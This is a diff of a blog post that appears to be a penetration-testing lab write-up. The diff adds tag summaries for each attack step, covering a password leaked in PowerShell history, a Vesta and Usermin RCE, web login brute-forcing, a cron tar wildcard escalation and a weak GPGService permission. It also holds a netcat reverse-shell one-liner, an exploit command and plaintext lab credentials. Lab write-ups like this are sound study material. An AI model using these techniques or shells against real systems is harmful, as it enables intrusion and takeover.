@@ -6,7 +6,13 @@ ShowToc: true
 TocOpen: true
 tags:
   - blog
-lastmod: 2026-02-07T06:19:37.778Z
+  - Windows-Privilege-Escalation-sensitive-data-PS-History-File-leak
+  - vesta-rce-exploit
+  - PDF-Check
+  - Web-login-bruteForce
+  - Linux-Privilege-Escalation-Cron-tar-Wild
+  - Windows-Privilege-Escalation-GPGservice
+lastmod: 2026-02-07T08:37:54.682Z
 ---
 # Box Info
 
@@ -232,6 +238,12 @@ PORT      STATE SERVICE
 Nmap done: 1 IP address (1 host up) scanned in 199.34 seconds
 
 ```
+
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag " Windows-Privilege-Escalation-sensitive-data-PS-History-File-leak" >}} The history file of the `ConsoleHost_history.txt` can be found the password of `hghgib6vHT3bVWF`
+
+{{< /toggle >}}
 
 The history file of the `ConsoleHost_history.txt` can be found the password of `hghgib6vHT3bVWF`
 
@@ -678,6 +690,12 @@ The web 8080 is seem like the nginx proxy 80 proxy ,
 
 ### Web Recon  8083 jack to root (vesta-rce-exploit)
 
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "vesta-rce-exploit" >}} using the exploit to RCE
+
+{{< /toggle >}}
+
 login as by jack : 3PUKsX98BMupBiCf
 
 ![Pasted image 20260102134916.png](/ob/Pasted%20image%2020260102134916.png)\
@@ -858,7 +876,11 @@ ftp> ls
 
 ### PDF Check
 
-to-do : create the forensic  for the pdf
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "PDF-Check" >}} exiftool \*.pdf  to find 3 usernames
+
+{{< /toggle >}}
 
 ```shell
 └─# exiftool *.pdf              
@@ -988,6 +1010,12 @@ robert
 
 ***
 
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "Web-login-bruteForce" >}} use the username and the password also is the username to login, and have the rce to get the shell
+
+{{< /toggle >}}
+
 ### Web Recon 20000 To Cassie (cve-2024-44762 usermin rce)
 
 we can login in by cassie:cassie
@@ -1089,6 +1117,11 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.45.203 21 >/tmp/
 ```
 
 ### cassie to root (Cron tar Wild Privilege Escalation)
+
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "Linux-Privilege-Escalation-Cron-tar-Wild" >}} found the 2minutes in /etc/crontab.d , inject it to get the root with tar Wild Privilege Escalation\
+{{< /toggle >}}
 
 cron show something should not by here
 
@@ -1375,6 +1408,12 @@ uv run exploit.py --target 192.168.126.155  --file   ./rev80.exe --lhost 192.168
 ![Pasted image 20260106163407.png](/ob/Pasted%20image%2020260106163407.png)
 
 ### Tom to Admin (GPGService.exe Local Privilege Escalation)
+
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "Windows-Privilege-Escalation-GPGservice" >}} repalce the service as my revshell shell to get the admin due to weak control
+
+{{< /toggle >}}
 
 After login as Tom, use the winpeas.exe to check the file , and found the MilleGPG5 is easy to be attacked
 
